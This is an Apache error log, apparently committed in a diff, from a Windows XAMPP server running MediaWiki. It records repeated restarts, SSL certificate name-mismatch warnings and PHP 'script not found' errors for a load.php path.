+[Fri Apr 22 23:22:19.214292 2022] [mpm_winnt:notice] [pid 2332:tid 576] AH00430: Parent: Child process 4496 exited successfully.
+[Fri Apr 22 23:22:23.290954 2022] [ssl:warn] [pid 5504:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:22:23.331986 2022] [ssl:warn] [pid 5504:tid 580] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:22:23.364692 2022] [mpm_winnt:notice] [pid 5504:tid 580] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:22:23.364692 2022] [mpm_winnt:notice] [pid 5504:tid 580] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:22:23.364692 2022] [core:notice] [pid 5504:tid 580] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:22:23.367626 2022] [mpm_winnt:notice] [pid 5504:tid 580] AH00418: Parent: Created child process 7716
+[Fri Apr 22 23:22:23.744099 2022] [ssl:warn] [pid 7716:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:22:23.775345 2022] [ssl:warn] [pid 7716:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:22:23.801713 2022] [mpm_winnt:notice] [pid 7716:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:22:59.870561 2022] [mpm_winnt:notice] [pid 5504:tid 580] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:23:01.872513 2022] [mpm_winnt:notice] [pid 7716:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:23:02.190387 2022] [mpm_winnt:notice] [pid 5504:tid 580] AH00430: Parent: Child process 7716 exited successfully.
+[Fri Apr 22 23:23:48.501918 2022] [ssl:warn] [pid 5660:tid 584] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:23:48.537573 2022] [ssl:warn] [pid 5660:tid 584] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:23:48.570767 2022] [mpm_winnt:notice] [pid 5660:tid 584] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:23:48.570767 2022] [mpm_winnt:notice] [pid 5660:tid 584] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:23:48.570767 2022] [core:notice] [pid 5660:tid 584] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:23:48.573706 2022] [mpm_winnt:notice] [pid 5660:tid 584] AH00418: Parent: Created child process 3536
+[Fri Apr 22 23:23:48.865197 2022] [ssl:warn] [pid 3536:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:23:48.898890 2022] [ssl:warn] [pid 3536:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:23:48.925267 2022] [mpm_winnt:notice] [pid 3536:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:25:20.603993 2022] [mpm_winnt:notice] [pid 5660:tid 584] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:25:22.608890 2022] [mpm_winnt:notice] [pid 3536:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:25:22.893567 2022] [mpm_winnt:notice] [pid 5660:tid 584] AH00430: Parent: Child process 3536 exited successfully.
+[Fri Apr 22 23:26:36.838403 2022] [ssl:warn] [pid 6980:tid 524] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:26:36.877954 2022] [ssl:warn] [pid 6980:tid 524] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:26:36.913111 2022] [mpm_winnt:notice] [pid 6980:tid 524] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:26:36.913111 2022] [mpm_winnt:notice] [pid 6980:tid 524] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:26:36.913111 2022] [core:notice] [pid 6980:tid 524] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:26:36.916038 2022] [mpm_winnt:notice] [pid 6980:tid 524] AH00418: Parent: Created child process 6108
+[Fri Apr 22 23:26:37.215352 2022] [ssl:warn] [pid 6108:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:26:37.246603 2022] [ssl:warn] [pid 6108:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:26:37.274439 2022] [mpm_winnt:notice] [pid 6108:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:26:47.640153 2022] [php7:error] [pid 6108:tid 1808] [client 117.184.69.178:53650] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:26:47.643073 2022] [php7:error] [pid 6108:tid 1812] [client 117.184.69.178:53651] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:26:47.759287 2022] [php7:error] [pid 6108:tid 1808] [client 117.184.69.178:53657] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:26:53.194830 2022] [php7:error] [pid 6108:tid 1808] [client 117.184.69.178:53694] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:26:53.200690 2022] [php7:error] [pid 6108:tid 1812] [client 117.184.69.178:53693] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:26:53.257337 2022] [php7:error] [pid 6108:tid 1804] [client 117.184.69.178:53696] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:27:24.311557 2022] [mpm_winnt:notice] [pid 6980:tid 524] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:27:26.313495 2022] [mpm_winnt:notice] [pid 6108:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:27:26.608906 2022] [mpm_winnt:notice] [pid 6980:tid 524] AH00430: Parent: Child process 6108 exited successfully.
+[Fri Apr 22 23:27:27.942407 2022] [ssl:warn] [pid 7248:tid 532] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:27:27.985373 2022] [ssl:warn] [pid 7248:tid 532] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:27:28.020050 2022] [mpm_winnt:notice] [pid 7248:tid 532] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:27:28.020050 2022] [mpm_winnt:notice] [pid 7248:tid 532] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:27:28.020050 2022] [core:notice] [pid 7248:tid 532] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:27:28.029813 2022] [mpm_winnt:notice] [pid 7248:tid 532] AH00418: Parent: Created child process 7780
+[Fri Apr 22 23:27:28.323278 2022] [ssl:warn] [pid 7780:tid 512] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:27:28.362324 2022] [ssl:warn] [pid 7780:tid 512] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:27:28.398954 2022] [mpm_winnt:notice] [pid 7780:tid 512] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:27:33.966339 2022] [php7:error] [pid 7780:tid 1812] [client 117.184.69.178:53931] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:27:33.972688 2022] [php7:error] [pid 7780:tid 1808] [client 117.184.69.178:53932] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:27:34.058126 2022] [php7:error] [pid 7780:tid 1808] [client 117.184.69.178:53934] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:12.614300 2022] [mpm_winnt:notice] [pid 7248:tid 532] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:28:14.616244 2022] [mpm_winnt:notice] [pid 7780:tid 512] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:28:14.650432 2022] [mpm_winnt:notice] [pid 7248:tid 532] AH00430: Parent: Child process 7780 exited successfully.
+[Fri Apr 22 23:28:18.978078 2022] [ssl:warn] [pid 5124:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:28:19.011280 2022] [ssl:warn] [pid 5124:tid 576] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:28:19.046917 2022] [mpm_winnt:notice] [pid 5124:tid 576] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:28:19.046917 2022] [mpm_winnt:notice] [pid 5124:tid 576] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:28:19.046917 2022] [core:notice] [pid 5124:tid 576] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:28:19.048894 2022] [mpm_winnt:notice] [pid 5124:tid 576] AH00418: Parent: Created child process 4828
+[Fri Apr 22 23:28:19.334524 2022] [ssl:warn] [pid 4828:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:28:19.365772 2022] [ssl:warn] [pid 4828:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:28:19.393115 2022] [mpm_winnt:notice] [pid 4828:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:28:26.195850 2022] [php7:error] [pid 4828:tid 1824] [client 117.184.69.178:54236] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:26.195850 2022] [php7:error] [pid 4828:tid 1820] [client 117.184.69.178:54237] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:26.306674 2022] [php7:error] [pid 4828:tid 1824] [client 117.184.69.178:54243] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:31.870162 2022] [php7:error] [pid 4828:tid 1824] [client 117.184.69.178:54268] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:31.908722 2022] [php7:error] [pid 4828:tid 1820] [client 117.184.69.178:54271] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:31.953645 2022] [php7:error] [pid 4828:tid 1824] [client 117.184.69.178:54277] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:28:59.916062 2022] [mpm_winnt:notice] [pid 5124:tid 576] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:29:01.918987 2022] [mpm_winnt:notice] [pid 4828:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:29:01.955611 2022] [mpm_winnt:notice] [pid 5124:tid 576] AH00430: Parent: Child process 4828 exited successfully.
+[Fri Apr 22 23:29:03.844773 2022] [ssl:warn] [pid 5984:tid 600] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:03.895563 2022] [ssl:warn] [pid 5984:tid 600] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:03.928766 2022] [mpm_winnt:notice] [pid 5984:tid 600] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:29:03.928766 2022] [mpm_winnt:notice] [pid 5984:tid 600] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:29:03.928766 2022] [core:notice] [pid 5984:tid 600] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:29:03.932674 2022] [mpm_winnt:notice] [pid 5984:tid 600] AH00418: Parent: Created child process 7348
+[Fri Apr 22 23:29:04.221251 2022] [ssl:warn] [pid 7348:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:04.252497 2022] [ssl:warn] [pid 7348:tid 508] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:04.280329 2022] [mpm_winnt:notice] [pid 7348:tid 508] AH00354: Child: Starting 150 worker threads.
+[Fri Apr 22 23:29:09.346734 2022] [php7:error] [pid 7348:tid 1812] [client 117.184.69.178:54474] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:29:09.347706 2022] [php7:error] [pid 7348:tid 1808] [client 117.184.69.178:54475] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:29:09.427302 2022] [php7:error] [pid 7348:tid 1812] [client 117.184.69.178:54477] script 'C:/Users/Administrator/lox/load.php' not found or unable to stat, referer: http://121.4.151.34/Mediawiki/index.php/%E9%A6%96%E9%A1%B5
+[Fri Apr 22 23:29:49.479072 2022] [mpm_winnt:notice] [pid 5984:tid 600] AH00422: Parent: Received shutdown signal -- Shutting down the server.
+[Fri Apr 22 23:29:51.480526 2022] [mpm_winnt:notice] [pid 7348:tid 508] AH00364: Child: All worker threads have exited.
+[Fri Apr 22 23:29:51.764704 2022] [mpm_winnt:notice] [pid 5984:tid 600] AH00430: Parent: Child process 7348 exited successfully.
+[Fri Apr 22 23:29:52.911191 2022] [ssl:warn] [pid 2760:tid 596] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:52.951238 2022] [ssl:warn] [pid 2760:tid 596] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:52.984943 2022] [mpm_winnt:notice] [pid 2760:tid 596] AH00455: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 configured -- resuming normal operations
+[Fri Apr 22 23:29:52.984943 2022] [mpm_winnt:notice] [pid 2760:tid 596] AH00456: Apache Lounge VC15 Server built: May 26 2021 14:28:02
+[Fri Apr 22 23:29:52.984943 2022] [core:notice] [pid 2760:tid 596] AH00094: Command line: 'C:\\xamppp\\apache\\bin\\httpd.exe -d C:/xamppp/apache'
+[Fri Apr 22 23:29:52.988842 2022] [mpm_winnt:notice] [pid 2760:tid 596] AH00418: Parent: Created child process 7916
+[Fri Apr 22 23:29:53.308672 2022] [ssl:warn] [pid 7916:tid 488] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Fri Apr 22 23:29:53.340894 2022] [ssl:warn] [pid 7916:tid 488] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
